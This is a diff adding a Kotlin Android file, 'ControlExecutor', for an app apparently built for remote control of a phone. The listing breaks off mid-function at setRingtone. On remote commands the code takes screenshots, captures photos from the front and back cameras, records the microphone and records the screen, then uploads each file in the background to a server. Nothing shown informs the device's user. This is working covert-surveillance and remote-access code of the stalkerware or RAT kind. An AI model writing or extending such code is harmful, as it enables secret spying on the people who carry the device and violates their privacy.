@@ -1,0 +1,1472 @@
+     1→package com.abuzahra.manager.executor
+     2→
+     3→import android.Manifest
+     4→import android.app.AlarmManager
+     5→import android.app.NotificationChannel
+     6→import android.app.NotificationManager
+     7→import android.app.PendingIntent
+     8→import android.content.Context
+     9→import android.content.Intent
+    10→import android.media.AudioManager
+    11→import android.content.pm.PackageManager
+    12→import android.graphics.Bitmap
+    13→import android.graphics.ImageFormat
+    14→import android.graphics.Rect
+    15→import android.graphics.YuvImage
+    16→import android.hardware.camera2.CameraCaptureSession
+    17→import android.hardware.camera2.CameraCharacteristics
+    18→import android.hardware.camera2.CameraDevice
+    19→import android.hardware.camera2.CameraManager
+    20→import android.hardware.camera2.CaptureRequest
+    21→import android.hardware.display.DisplayManager
+    22→import android.hardware.display.VirtualDisplay
+    23→import android.media.AudioAttributes
+    24→import android.media.AudioFormat
+    25→import android.media.AudioRecord
+    26→import android.media.Image
+    27→import android.media.ImageReader
+    28→import android.media.MediaRecorder
+    29→import android.media.projection.MediaProjection
+    30→import android.media.projection.MediaProjectionManager
+    31→import android.os.Build
+    32→import android.os.Environment
+    33→import android.os.Handler
+    34→import android.os.HandlerThread
+    35→import android.os.VibrationEffect
+    36→import android.os.Vibrator
+    37→import android.provider.Settings
+    38→import android.telephony.SmsManager
+    39→import android.util.Base64
+    40→import android.util.Log
+    41→import android.view.Surface
+    42→import androidx.annotation.RequiresApi
+    43→import androidx.core.app.ActivityCompat
+    44→import androidx.core.app.NotificationCompat
+    45→import com.abuzahra.manager.R
+    46→import com.abuzahra.manager.api.ApiClient
+    47→import com.abuzahra.manager.service.MyAccessibilityService
+    48→import com.abuzahra.manager.service.ScreenCaptureService
+    49→import kotlinx.coroutines.CoroutineScope
+    50→import kotlinx.coroutines.Dispatchers
+    51→import kotlinx.coroutines.launch
+    52→import kotlinx.coroutines.withContext
+    53→import java.io.ByteArrayOutputStream
+    54→import java.io.File
+    55→import java.io.FileInputStream
+    56→import java.io.FileOutputStream
+    57→import java.text.SimpleDateFormat
+    58→import java.util.Date
+    59→import java.util.Locale
+    60→import java.util.concurrent.CountDownLatch
+    61→import java.util.concurrent.TimeUnit
+    62→
+    63→/**
+    64→ * ControlExecutor - Complete Implementation
+    65→ * All remote control commands with real functionality
+    66→ */
+    67→object ControlExecutor {
+    68→
+    69→    private const val TAG = "ControlExecutor"
+    70→    private const val NOTIFICATION_CHANNEL_ID = "abu_zahra_control"
+    71→    
+    72→    // Camera state
+    73→    private var cameraDevice: CameraDevice? = null
+    74→    private var cameraSession: CameraCaptureSession? = null
+    75→    private var imageReader: ImageReader? = null
+    76→    private var cameraThread: HandlerThread? = null
+    77→    private var cameraHandler: Handler? = null
+    78→    
+    79→    // Audio recording state
+    80→    private var mediaRecorder: MediaRecorder? = null
+    81→    private var audioRecord: AudioRecord? = null
+    82→    private var isRecordingAudio = false
+    83→    private var audioRecordFile: File? = null
+    84→    
+    85→    // Screen capture state
+    86→    private var mediaProjection: MediaProjection? = null
+    87→    private var virtualDisplay: VirtualDisplay? = null
+    88→    private var screenImageReader: ImageReader? = null
+    89→    private var isCapturingScreen = false
+    90→    private var screenCaptureLatch: CountDownLatch? = null
+    91→    private var capturedScreenBitmap: Bitmap? = null
+    92→    
+    93→    // Video recording state
+    94→    private var screenRecorder: MediaRecorder? = null
+    95→    private var isRecordingScreen = false
+    96→    private var screenRecordFile: File? = null
+    97→
+    98→    // ===== PING =====
+    99→    fun ping(): Map<String, Any> {
+   100→        return mapOf(
+   101→            "status" to "online",
+   102→            "timestamp" to System.currentTimeMillis(),
+   103→            "uptime" to (System.currentTimeMillis() - com.abuzahra.manager.App.instance.startTime),
+   104→            "message" to "Device is online and responding"
+   105→        )
+   106→    }
+   107→
+   108→    // ===== VIBRATE =====
+   109→    fun vibrate(context: Context, params: Map<String, Any>): String {
+   110→        return try {
+   111→            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+   112→            if (!vibrator.hasVibrator()) return "Device has no vibrator"
+   113→            
+   114→            val duration = ((params["arg"]?.toString()?.toLongOrNull() ?: 1000L)).coerceAtMost(5000)
+   115→            val pattern = params["pattern"] as? List<Long>
+   116→            
+   117→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+   118→                val effect = if (pattern != null && pattern.isNotEmpty()) {
+   119→                    VibrationEffect.createWaveform(pattern.toLongArray(), -1)
+   120→                } else {
+   121→                    VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE)
+   122→                }
+   123→                vibrator.vibrate(effect)
+   124→            } else {
+   125→                @Suppress("DEPRECATION")
+   126→                if (pattern != null && pattern.isNotEmpty()) {
+   127→                    vibrator.vibrate(pattern.toLongArray(), -1)
+   128→                } else {
+   129→                    vibrator.vibrate(duration)
+   130→                }
+   131→            }
+   132→            "Vibrating for ${duration}ms"
+   133→        } catch (e: Exception) {
+   134→            Log.e(TAG, "Vibrate error", e)
+   135→            "Error: ${e.message}"
+   136→        }
+   137→    }
+   138→
+   139→    // ===== RING =====
+   140→    fun ring(context: Context): String {
+   141→        return try {
+   142→            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+   143→            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
+   144→            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
+   145→
+   146→            val uri = Settings.System.DEFAULT_RINGTONE_URI
+   147→            val player = android.media.MediaPlayer.create(context, uri)
+   148→            player?.setAudioAttributes(
+   149→                AudioAttributes.Builder()
+   150→                    .setUsage(AudioAttributes.USAGE_NOTIFICATION_RINGTONE)
+   151→                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
+   152→                    .build()
+   153→            )
+   154→            player?.isLooping = true
+   155→            player?.start()
+   156→            player?.setOnCompletionListener { it.release() }
+   157→            
+   158→            // Auto-stop after 30 seconds
+   159→            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+   160→                try { player?.stop(); player?.release() } catch (_: Exception) {}
+   161→            }, 30000)
+   162→            "Ringing..."
+   163→        } catch (e: Exception) {
+   164→            Log.e(TAG, "Ring error", e)
+   165→            "Error: ${e.message}"
+   166→        }
+   167→    }
+   168→
+   169→    // ===== SCREENSHOT - REAL IMPLEMENTATION =====
+   170→    fun takeScreenshot(context: Context): Map<String, Any> {
+   171→        return try {
+   172→            // Check if we have screen capture permission
+   173→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+   174→                val resultCode = ScreenCaptureService.lastResultCode
+   175→                val data = ScreenCaptureService.lastPermissionData
+   176→                
+   177→                if (resultCode == 0 || data == null) {
+   178→                    return mapOf(
+   179→                        "status" to "permission_required",
+   180→                        "message" to "Screen capture permission needed. Grant permission first.",
+   181→                        "action" to "request_screen_capture"
+   182→                    )
+   183→                }
+   184→                
+   185→                // Use the service to capture
+   186→                val screenshotResult = captureScreenReal(context, resultCode, data)
+   187→                screenshotResult
+   188→            } else {
+   189→                mapOf("error" to "Screenshot requires Android 5.0+")
+   190→            }
+   191→        } catch (e: Exception) {
+   192→            Log.e(TAG, "Screenshot error", e)
+   193→            mapOf("error" to (e.message ?: "Screenshot failed"))
+   194→        }
+   195→    }
+   196→    
+   197→    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
+   198→    private fun captureScreenReal(context: Context, resultCode: Int, data: Intent): Map<String, Any> {
+   199→        val latch = CountDownLatch(1)
+   200→        var resultBitmap: Bitmap? = null
+   201→        var error: String? = null
+   202→        
+   203→        try {
+   204→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+   205→            val projection = mpm.getMediaProjection(resultCode, data)
+   206→            
+   207→            if (projection == null) {
+   208→                return mapOf("error" to "Failed to create media projection")
+   209→            }
+   210→            
+   211→            val metrics = context.resources.displayMetrics
+   212→            val width = metrics.widthPixels
+   213→            val height = metrics.heightPixels
+   214→            val density = metrics.densityDpi
+   215→            
+   216→            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
+   217→            
+   218→            val virtualDisplay = projection.createVirtualDisplay(
+   219→                "ScreenCapture",
+   220→                width, height, density,
+   221→                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+   222→                imageReader.surface, null, null
+   223→            )
+   224→            
+   225→            imageReader.setOnImageAvailableListener({ reader ->
+   226→                try {
+   227→                    val image = reader.acquireLatestImage()
+   228→                    if (image != null) {
+   229→                        val planes = image.planes
+   230→                        val buffer = planes[0].buffer
+   231→                        val bytes = ByteArray(buffer.remaining())
+   232→                        buffer.get(bytes)
+   233→                        
+   234→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+   235→                        if (bitmap != null) {
+   236→                            resultBitmap = bitmap
+   237→                        }
+   238→                        image.close()
+   239→                        latch.countDown()
+   240→                    }
+   241→                } catch (e: Exception) {
+   242→                    error = e.message
+   243→                    latch.countDown()
+   244→                }
+   245→            }, Handler(context.mainLooper))
+   246→            
+   247→            // Wait for capture
+   248→            latch.await(5, TimeUnit.SECONDS)
+   249→            
+   250→            // Cleanup
+   251→            virtualDisplay?.release()
+   252→            imageReader?.close()
+   253→            projection.stop()
+   254→            
+   255→            if (resultBitmap != null) {
+   256→                // Convert to base64
+   257→                val stream = ByteArrayOutputStream()
+   258→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
+   259→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
+   260→                
+   261→                // Save to file
+   262→                val file = File(context.cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
+   263→                FileOutputStream(file).use { it.write(stream.toByteArray()) }
+   264→                
+   265→                // Upload to server (file will be cached for streaming viewer)
+   266→                CoroutineScope(Dispatchers.IO).launch {
+   267→                    try {
+   268→                        ApiClient.uploadFile(file, "screenshot")
+   269→                    } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
+   270→                }
+   271→                
+   272→                // Return full base64 for streaming viewer (server caches this)
+   273→                return mapOf(
+   274→                    "status" to "success",
+   275→                    "message" to "Screenshot captured",
+   276→                    "width" to resultBitmap!!.width,
+   277→                    "height" to resultBitmap!!.height,
+   278→                    "size" to stream.size(),
+   279→                    "file" to file.name,
+   280→                    "base64_preview" to base64
+   281→                )
+   282→            } else {
+   283→                return mapOf("error" to (error ?: "Failed to capture screen"))
+   284→            }
+   285→        } catch (e: Exception) {
+   286→            Log.e(TAG, "Screen capture error", e)
+   287→            return mapOf("error" to (e.message ?: "Unknown error"))
+   288→        }
+   289→    }
+   290→
+   291→    // ===== CAMERA CAPTURE - REAL IMPLEMENTATION =====
+   292→    fun frontCamera(context: Context): Map<String, Any> {
+   293→        return takePhotoReal(context, CameraCharacteristics.LENS_FACING_FRONT)
+   294→    }
+   295→
+   296→    fun backCamera(context: Context): Map<String, Any> {
+   297→        return takePhotoReal(context, CameraCharacteristics.LENS_FACING_BACK)
+   298→    }
+   299→    
+   300→    private fun takePhotoReal(context: Context, facing: Int): Map<String, Any> {
+   301→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
+   302→            return mapOf("error" to "Camera2 requires Android 5.0+")
+   303→        }
+   304→        
+   305→        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+   306→            return mapOf(
+   307→                "error" to "Camera permission not granted",
+   308→                "permission_required" to "android.permission.CAMERA"
+   309→            )
+   310→        }
+   311→        
+   312→        val latch = CountDownLatch(1)
+   313→        var resultBitmap: Bitmap? = null
+   314→        var errorMessage: String? = null
+   315→        
+   316→        try {
+   317→            val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+   318→            var cameraId: String? = null
+   319→            
+   320→            // Find camera with correct facing
+   321→            for (id in manager.cameraIdList) {
+   322→                val characteristics = manager.getCameraCharacteristics(id)
+   323→                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
+   324→                if (lensFacing == facing) {
+   325→                    cameraId = id
+   326→                    break
+   327→                }
+   328→            }
+   329→            
+   330→            if (cameraId == null) {
+   331→                return mapOf("error" to "No ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera found")
+   332→            }
+   333→            
+   334→            // Setup handler thread
+   335→            val thread = HandlerThread("CameraThread").apply { start() }
+   336→            val handler = Handler(thread.looper)
+   337→            
+   338→            // Get optimal size
+   339→            val characteristics = manager.getCameraCharacteristics(cameraId)
+   340→            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+   341→            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
+   342→            val size = sizes?.maxByOrNull { it.width * it.height }
+   343→                ?: return mapOf("error" to "No supported JPEG sizes")
+   344→            
+   345→            // Create image reader
+   346→            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
+   347→            
+   348→            reader.setOnImageAvailableListener({ imageReader ->
+   349→                try {
+   350→                    val image = imageReader.acquireLatestImage()
+   351→                    if (image != null) {
+   352→                        val buffer = image.planes[0].buffer
+   353→                        val bytes = ByteArray(buffer.remaining())
+   354→                        buffer.get(bytes)
+   355→                        
+   356→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+   357→                        resultBitmap = bitmap
+   358→                        
+   359→                        // Save to file
+   360→                        val file = File(context.cacheDir, "camera_${System.currentTimeMillis()}.jpg")
+   361→                        FileOutputStream(file).use { it.write(bytes) }
+   362→                        
+   363→                        // Upload in background (with device_id for server identification)
+   364→                        CoroutineScope(Dispatchers.IO).launch {
+   365→                            try { ApiClient.uploadFile(file, "camera") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
+   366→                        }
+   367→                        
+   368→                        image.close()
+   369→                    }
+   370→                } catch (e: Exception) {
+   371→                    errorMessage = e.message
+   372→                }
+   373→                latch.countDown()
+   374→            }, handler)
+   375→            
+   376→            // Open camera
+   377→            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+   378→                override fun onOpened(camera: CameraDevice) {
+   379→                    try {
+   380→                        val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+   381→                        captureRequest.addTarget(reader.surface)
+   382→                        captureRequest.set(CaptureRequest.JPEG_ORIENTATION, 90)
+   383→                        
+   384→                        camera.createCaptureSession(
+   385→                            listOf(reader.surface),
+   386→                            object : CameraCaptureSession.StateCallback() {
+   387→                                override fun onConfigured(session: CameraCaptureSession) {
+   388→                                    session.capture(captureRequest.build(), null, handler)
+   389→                                    
+   390→                                    // Close after capture
+   391→                                    handler.postDelayed({
+   392→                                        camera.close()
+   393→                                        reader.close()
+   394→                                        thread.quitSafely()
+   395→                                    }, 2000)
+   396→                                }
+   397→                                
+   398→                                override fun onConfigureFailed(session: CameraCaptureSession) {
+   399→                                    errorMessage = "Session configuration failed"
+   400→                                    latch.countDown()
+   401→                                }
+   402→                            },
+   403→                            handler
+   404→                        )
+   405→                    } catch (e: Exception) {
+   406→                        errorMessage = e.message
+   407→                        latch.countDown()
+   408→                    }
+   409→                }
+   410→                
+   411→                override fun onDisconnected(camera: CameraDevice) {
+   412→                    camera.close()
+   413→                }
+   414→                
+   415→                override fun onError(camera: CameraDevice, error: Int) {
+   416→                    errorMessage = "Camera error: $error"
+   417→                    camera.close()
+   418→                    latch.countDown()
+   419→                }
+   420→            }, handler)
+   421→            
+   422→            // Wait for result
+   423→            val success = latch.await(10, TimeUnit.SECONDS)
+   424→            
+   425→            if (resultBitmap != null) {
+   426→                val stream = ByteArrayOutputStream()
+   427→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
+   428→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
+   429→                
+   430→                return mapOf(
+   431→                    "status" to "success",
+   432→                    "message" to "Photo captured from ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera",
+   433→                    "width" to resultBitmap!!.width,
+   434→                    "height" to resultBitmap!!.height,
+   435→                    "size" to stream.size(),
+   436→                    "base64_preview" to base64
+   437→                )
+   438→            } else {
+   439→                return mapOf("error" to (errorMessage ?: "Failed to capture photo"))
+   440→            }
+   441→        } catch (e: Exception) {
+   442→            Log.e(TAG, "Camera capture error", e)
+   443→            return mapOf("error" to (e.message ?: "Camera capture failed"))
+   444→        }
+   445→    }
+   446→
+   447→    // ===== AUDIO RECORDING - REAL IMPLEMENTATION =====
+   448→    fun startAudioRecording(context: Context, params: Map<String, Any>): Map<String, Any> {
+   449→        return try {
+   450→            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+   451→                return mapOf(
+   452→                    "error" to "RECORD_AUDIO permission not granted",
+   453→                    "permission_required" to "android.permission.RECORD_AUDIO"
+   454→                )
+   455→            }
+   456→            
+   457→            if (isRecordingAudio) {
+   458→                return mapOf("error" to "Already recording audio")
+   459→            }
+   460→            
+   461→            val duration = (params["duration"] as? Number)?.toInt() ?: 60
+   462→            val sampleRate = 44100
+   463→            val channelConfig = AudioFormat.CHANNEL_IN_MONO
+   464→            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
+   465→            val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
+   466→            
+   467→            val audioFile = File(context.cacheDir, "audio_${System.currentTimeMillis()}.m4a")
+   468→            audioRecordFile = audioFile
+   469→            
+   470→            // Use MediaRecorder for compressed audio
+   471→            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+   472→                MediaRecorder(context)
+   473→            } else {
+   474→                @Suppress("DEPRECATION")
+   475→                MediaRecorder()
+   476→            }
+   477→            
+   478→            mediaRecorder?.apply {
+   479→                setAudioSource(MediaRecorder.AudioSource.MIC)
+   480→                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+   481→                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+   482→                setAudioSamplingRate(sampleRate)
+   483→                setAudioEncodingBitRate(128000)
+   484→                setOutputFile(audioFile.absolutePath)
+   485→                prepare()
+   486→                start()
+   487→            }
+   488→            
+   489→            isRecordingAudio = true
+   490→            
+   491→            // Auto-stop after duration
+   492→            CoroutineScope(Dispatchers.Main).launch {
+   493→                kotlinx.coroutines.delay(duration * 1000L)
+   494→                if (isRecordingAudio) {
+   495→                    stopAudioRecording(context)
+   496→                }
+   497→            }
+   498→            
+   499→            mapOf(
+   500→                "status" to "recording",
+   501→                "message" to "Audio recording started",
+   502→                "duration_seconds" to duration,
+   503→                "file" to audioFile.name
+   504→            )
+   505→        } catch (e: Exception) {
+   506→            Log.e(TAG, "Audio recording start error", e)
+   507→            mapOf("error" to (e.message ?: "Failed to start audio recording"))
+   508→        }
+   509→    }
+   510→    
+   511→    fun stopAudioRecording(context: Context): Map<String, Any> {
+   512→        return try {
+   513→            if (!isRecordingAudio) {
+   514→                return mapOf("error" to "Not recording audio")
+   515→            }
+   516→            
+   517→            mediaRecorder?.apply {
+   518→                stop()
+   519→                release()
+   520→            }
+   521→            mediaRecorder = null
+   522→            isRecordingAudio = false
+   523→            
+   524→            val file = audioRecordFile
+   525→            if (file != null && file.exists()) {
+   526→                // Upload to server
+   527→                CoroutineScope(Dispatchers.IO).launch {
+   528→                    try { ApiClient.uploadFile(file, "audio") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
+   529→                }
+   530→                
+   531→                mapOf(
+   532→                    "status" to "success",
+   533→                    "message" to "Audio recording stopped",
+   534→                    "file" to file.name,
+   535→                    "size" to file.length()
+   536→                )
+   537→            } else {
+   538→                mapOf("error" to "Audio file not found")
+   539→            }
+   540→        } catch (e: Exception) {
+   541→            Log.e(TAG, "Audio recording stop error", e)
+   542→            mapOf("error" to (e.message ?: "Failed to stop audio recording"))
+   543→        }
+   544→    }
+   545→    
+   546→    fun recordAudio(context: Context, params: Map<String, Any>): Map<String, Any> {
+   547→        val duration = (params["arg"]?.toString()?.toIntOrNull() ?: 30).coerceIn(1, 300)
+   548→        val startResult = startAudioRecording(context, mapOf("duration" to duration))
+   549→        
+   550→        if (startResult["error"] != null) {
+   551→            return startResult
+   552→        }
+   553→        
+   554→        return mapOf(
+   555→            "status" to "started",
+   556→            "message" to "Audio recording started for ${duration} seconds",
+   557→            "will_auto_stop" to true,
+   558→            "stop_command" to "Use stop_audio_recording to stop manually"
+   559→        )
+   560→    }
+   561→
+   562→    // ===== SCREEN RECORDING - REAL IMPLEMENTATION =====
+   563→    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
+   564→    fun startScreenRecording(context: Context, params: Map<String, Any>): Map<String, Any> {
+   565→        if (isRecordingScreen) {
+   566→            return mapOf("error" to "Already recording screen")
+   567→        }
+   568→        
+   569→        val resultCode = ScreenCaptureService.lastResultCode
+   570→        val data = ScreenCaptureService.lastPermissionData
+   571→        
+   572→        if (resultCode == 0 || data == null) {
+   573→            return mapOf(
+   574→                "error" to "Screen capture permission not granted",
+   575→                "action" to "request_screen_capture"
+   576→            )
+   577→        }
+   578→        
+   579→        return try {
+   580→            val duration = (params["duration"] as? Number)?.toInt() ?: 60
+   581→            val metrics = context.resources.displayMetrics
+   582→            val width = metrics.widthPixels
+   583→            val height = metrics.heightPixels
+   584→            val density = metrics.densityDpi
+   585→            
+   586→            val videoFile = File(context.cacheDir, "screen_${System.currentTimeMillis()}.mp4")
+   587→            screenRecordFile = videoFile
+   588→            
+   589→            // Create media projection
+   590→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+   591→            val projection = mpm.getMediaProjection(resultCode, data)
+   592→            mediaProjection = projection
+   593→            
+   594→            // Setup recorder
+   595→            screenRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+   596→                MediaRecorder(context)
+   597→            } else {
+   598→                @Suppress("DEPRECATION")
+   599→                MediaRecorder()
+   600→            }
+   601→            
+   602→            screenRecorder?.apply {
+   603→                setVideoSource(MediaRecorder.VideoSource.SURFACE)
+   604→                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+   605→                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+   606→                setVideoSize(width, height)
+   607→                setVideoFrameRate(30)
+   608→                setVideoEncodingBitRate(8 * 1000 * 1000) // 8 Mbps
+   609→                setOutputFile(videoFile.absolutePath)
+   610→                prepare()
+   611→            }
+   612→            
+   613→            // Create virtual display
+   614→            virtualDisplay = projection?.createVirtualDisplay(
+   615→                "ScreenRecord",
+   616→                width, height, density,
+   617→                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+   618→                screenRecorder?.surface, null, null
+   619→            )
+   620→            
+   621→            screenRecorder?.start()
+   622→            isRecordingScreen = true
+   623→            
+   624→            // Auto-stop after duration
+   625→            CoroutineScope(Dispatchers.Main).launch {
+   626→                kotlinx.coroutines.delay(duration * 1000L)
+   627→                if (isRecordingScreen) {
+   628→                    stopScreenRecording(context)
+   629→                }
+   630→            }
+   631→            
+   632→            mapOf(
+   633→                "status" to "recording",
+   634→                "message" to "Screen recording started",
+   635→                "duration_seconds" to duration,
+   636→                "resolution" to "${width}x${height}",
+   637→                "file" to videoFile.name
+   638→            )
+   639→        } catch (e: Exception) {
+   640→            Log.e(TAG, "Screen recording start error", e)
+   641→            mapOf("error" to (e.message ?: "Failed to start screen recording"))
+   642→        }
+   643→    }
+   644→    
+   645→    fun stopScreenRecording(context: Context): Map<String, Any> {
+   646→        if (!isRecordingScreen) {
+   647→            return mapOf("error" to "Not recording screen")
+   648→        }
+   649→        
+   650→        return try {
+   651→            screenRecorder?.apply {
+   652→                stop()
+   653→                release()
+   654→            }
+   655→            screenRecorder = null
+   656→            
+   657→            virtualDisplay?.release()
+   658→            virtualDisplay = null
+   659→            
+   660→            mediaProjection?.stop()
+   661→            mediaProjection = null
+   662→            
+   663→            isRecordingScreen = false
+   664→            
+   665→            val file = screenRecordFile
+   666→            if (file != null && file.exists()) {
+   667→                // Upload to server
+   668→                CoroutineScope(Dispatchers.IO).launch {
+   669→                    try { ApiClient.uploadFile(file, "video") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
+   670→                }
+   671→                
+   672→                mapOf(
+   673→                    "status" to "success",
+   674→                    "message" to "Screen recording stopped",
+   675→                    "file" to file.name,
+   676→                    "size" to file.length()
+   677→                )
+   678→            } else {
+   679→                mapOf("error" to "Video file not found")
+   680→            }
+   681→        } catch (e: Exception) {
+   682→            Log.e(TAG, "Screen recording stop error", e)
+   683→            mapOf("error" to (e.message ?: "Failed to stop screen recording"))
+   684→        }
+   685→    }
+   686→    
+   687→    fun recordScreen(context: Context, params: Map<String, Any>): Map<String, Any> {
+   688→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
+   689→            return mapOf("error" to "Screen recording requires Android 5.0+")
+   690→        }
+   691→        
+   692→        val duration = (params["arg"]?.toString()?.toIntOrNull() ?: 30).coerceIn(1, 300)
+   693→        return startScreenRecording(context, mapOf("duration" to duration))
+   694→    }
+   695→
+   696→    // ===== TORCH =====
+   697→    fun torchOn(context: Context): String {
+   698→        return try {
+   699→            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+   700→            for (id in cameraManager.cameraIdList) {
+   701→                val characteristics = cameraManager.getCameraCharacteristics(id)
+   702→                val flashAvailable = characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) ?: false
+   703→                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
+   704→                if (flashAvailable && lensFacing == CameraCharacteristics.LENS_FACING_BACK) {
+   705→                    cameraManager.setTorchMode(id, true)
+   706→                    return "Torch ON"
+   707→                }
+   708→            }
+   709→            "No flash available"
+   710→        } catch (e: Exception) {
+   711→            Log.e(TAG, "Torch on error", e)
+   712→            "Error: ${e.message}"
+   713→        }
+   714→    }
+   715→
+   716→    fun torchOff(context: Context): String {
+   717→        return try {
+   718→            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+   719→            for (id in cameraManager.cameraIdList) {
+   720→                try { cameraManager.setTorchMode(id, false) } catch (_: Exception) {}
+   721→            }
+   722→            "Torch OFF"
+   723→        } catch (e: Exception) {
+   724→            Log.e(TAG, "Torch off error", e)
+   725→            "Error: ${e.message}"
+   726→        }
+   727→    }
+   728→
+   729→    // ===== SET VOLUME =====
+   730→    fun setVolume(context: Context, params: Map<String, Any>): String {
+   731→        return try {
+   732→            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+   733→            val volumeStr = params["arg"]?.toString() ?: "50"
+   734→            val volume = volumeStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
+   735→            val streamType = when (params["stream"]?.toString()?.lowercase()) {
+   736→                "ring", "ringtone" -> AudioManager.STREAM_RING
+   737→                "alarm" -> AudioManager.STREAM_ALARM
+   738→                "notification" -> AudioManager.STREAM_NOTIFICATION
+   739→                "call", "voice_call" -> AudioManager.STREAM_VOICE_CALL
+   740→                "system" -> AudioManager.STREAM_SYSTEM
+   741→                else -> AudioManager.STREAM_MUSIC
+   742→            }
+   743→            val maxVol = am.getStreamMaxVolume(streamType)
+   744→            am.setStreamVolume(streamType, (maxVol * volume / 100), AudioManager.FLAG_SHOW_UI)
+   745→            "Volume set to $volume% for ${params["stream"] ?: "media"}"
+   746→        } catch (e: Exception) {
+   747→            Log.e(TAG, "Set volume error", e)
+   748→            "Error: ${e.message}"
+   749→        }
+   750→    }
+   751→
+   752→    // ===== SET BRIGHTNESS =====
+   753→    fun setBrightness(context: Context, params: Map<String, Any>): String {
+   754→        return try {
+   755→            val brightnessStr = params["arg"]?.toString() ?: "50"
+   756→            val brightness = brightnessStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
+   757→            
+   758→            // Check if can write settings
+   759→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && 
+   760→                !Settings.System.canWrite(context)) {
+   761→                context.startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
+   762→                    data = android.net.Uri.parse("package:${context.packageName}")
+   763→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+   764→                })
+   765→                return "Opening write settings permission"
+   766→            }
+   767→            
+   768→            // Set brightness mode to manual
+   769→            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, 
+   770→                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
+   771→            
+   772→            // Set brightness (0-255)
+   773→            val brightnessValue = (brightness * 255 / 100)
+   774→            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS, brightnessValue)
+   775→            "Brightness set to $brightness%"
+   776→        } catch (e: Exception) {
+   777→            Log.e(TAG, "Set brightness error", e)
+   778→            "Error: ${e.message}"
+   779→        }
+   780→    }
+   781→
+   782→    // ===== SET RINGTONE =====
+   783→    fun setRingtone(context: Context, params: Map<String, Any>): String {
+   784→        val arg = params["arg"]?.toString() ?: ""
+   785→        if (arg.isBlank()) return "No ringtone URI provided"
+   786→        return try {
+   787→            if (!Settings.System.canWrite(context)) {
+   788→                context.startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
+   789→                    data = android.net.Uri.parse("package:${context.packageName}")
+   790→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+   791→                })
+   792→                return "Opening write settings permission - grant WRITE_SETTINGS first"
+   793→            }
+   794→            val ringtoneUri = android.net.Uri.parse(arg)
+   795→            // Validate the URI by checking if we can open it
+   796→            val ringtone = android.media.RingtoneManager.getRingtone(context, ringtoneUri)
+   797→            if (ringtone != null) {
